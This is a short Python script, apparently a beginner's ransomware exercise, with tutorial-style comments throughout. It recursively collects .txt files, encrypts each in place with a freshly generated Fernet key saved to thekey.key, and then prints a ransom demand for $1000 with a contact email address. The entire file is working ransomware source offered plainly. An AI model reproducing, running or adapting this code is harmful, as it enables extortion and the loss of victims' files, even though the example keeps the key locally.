#!/usr/bin/env python3
# we are using glob and os packages from python 
import glob
import os

#we are using the Fernet (symmetric encryption) which is part of cryptography  package : https://cryptography.io/en/latest/
from cryptography.fernet import Fernet

# path to search file is store in the path varibale
path = '**/*.txt'
#path = '/home/tmethre/Downloads/test/test2/*'
inc = 1 
files = [] # we are creating a Python Lists that stores the name of the files
for file in glob.glob(path, recursive=True): # we use for each loop with glob (short for global) is used to return all file paths that match a specific pattern.
    print(file)
    if file == "virus.py" or file == "thekey.key" or file == "decrypt.py": # hear we are using if loop inside the for with equal to operations and checking each 
        continue                                                            # multiple files which are seperated by or
    files.append(file)       # this to add each files to the fiels list variable
    #if os.path.isfile(file):
    print(inc)
    inc = inc+1 # the value is incremented to count the number of files

print(files)

key = Fernet.generate_key() # we are storing the fernet key which will be generated when the program runs and that key is stored in the vraibale key 

# print(key)

with open("thekey.key","wb") as thekey: # now we are storing that key we have generated in a file so we can decript it later
    thekey.write(key)
    
for file in files: # 
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("\n !!!!!!!!! You Have Been Hacked !!!!!!!!!")
print("\n !!!!!!!!! If you want your files back you need to pay $1000 !!!!!!!!!")
print("\n !!!!!!!!! Contact us at m.nikhil29@gmail.com !!!!!!!!!") 


